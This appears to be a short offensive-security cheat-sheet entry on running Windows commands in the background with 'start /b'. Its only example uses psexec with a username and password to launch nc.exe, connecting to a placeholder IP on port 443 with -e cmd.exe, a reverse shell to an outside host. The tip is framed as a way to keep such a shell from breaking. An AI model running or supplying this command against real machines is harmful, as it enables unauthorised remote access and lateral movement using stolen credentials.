# Background Commands

## **Windows**

USE START /B \<title for background> \<actual command> so that the commands are run in the background and won't break the shell.

Example:

```
C:\Users\Public>start /b "shell" psexec.exe -accepteula -u COMPUTERNAME\username -p passwd "C:\Users\Public\nc.exe" <ip> 443 -e cmd.exe 
```

****
